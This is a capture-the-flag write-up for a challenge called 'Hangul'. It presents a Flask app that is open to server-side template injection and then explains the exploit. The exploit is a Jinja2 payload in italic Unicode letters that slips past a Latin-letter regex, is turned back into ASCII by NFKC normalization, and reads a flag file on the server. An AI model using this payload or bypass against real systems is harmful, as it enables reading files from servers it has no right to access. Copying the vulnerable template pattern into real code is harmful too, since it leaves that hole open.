# dream-hack-Hangul

## Source
```python
from flask import Flask, request, render_template_string
import re
import unicodedata

app = Flask(__name__)

# Section that outputs user input on the page
@app.route("/", methods=["GET", "POST"])
def index():
    message = ""
    if request.method == "POST":
        message = request.form["message"]
        if re.search("[a-zA-Z]", message):
            message = "한글을 사용합시다!"
        message = unicodedata.normalize("NFKC", message)    # for normalize Windows and Mac Hangul implementation
    return render_template_string('''
        <form method="POST">
            Message: <input type="text" name="message">
            <input type="submit">
        </form>
        <p>Repeat your message:</p>
        <div>%s</div>
    ''' % message)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

## Analysis

The server receives user input via the `message` parameter, then uses `re.search` to check whether the input contains any Latin character (a-z or A-Z). If it does, the server returns `한글을 사용합시다!` ("Let's use Hangul!"). Otherwise, the input is normalized and passed into `render_template_string` along with the response.

- `if re.search("[a-zA-Z]", message):` — matches `message` against Unicode code points U+0041–U+005A and U+0061–U+007A only.
- `unicodedata.normalize("NFKC", message):` — normalizes `message` to Unicode Normalization Form **NFKC**.

## Exploit

It's easy to spot that the server is vulnerable to [SSTI](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html) (Server-Side Template Injection), since the input is concatenated into the template string via `%s % message` **before** being passed to `render_template_string`.

**Confirm with `{{7*7}}`:**

<img width="239" height="104" alt="image" src="https://github.com/user-attachments/assets/ee08bdd4-f0ce-4bd9-a393-208245083780" />

**Filter bypass:**

`re.search` only matches code points in the ranges U+0041–U+005A and U+0061–U+007A, so we can abuse italic/bold Unicode letter variants to bypass the filter — these fall outside that range, so the regex check passes. `unicodedata.normalize` then collapses them back to plain ASCII via NFKC compatibility decomposition, restoring the original payload before it's rendered by Jinja2.

(Conversion tool: [Italic Text Generator](https://lingojam.com/ItalicTextGenerator))

**Payload:**
```
{{ 𝘳𝘦𝘲𝘶𝘦𝘴𝘵.__𝘤𝘭𝘢𝘴𝘴__._𝘭𝘰𝘢𝘥_𝘧𝘰𝘳𝘮_𝘥𝘢𝘵𝘢.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.__𝘣𝘶𝘪𝘭𝘵𝘪𝘯𝘴__.𝘰𝘱𝘦𝘯("/𝘩𝘰𝘮𝘦/𝘩𝘢𝘯𝘨𝘶𝘭/𝘧𝘭𝘢𝘨").𝘳𝘦𝘢𝘥() }}
```

**Flag:**
```
WaRP{Handwr1t1ng_Fil********}
```
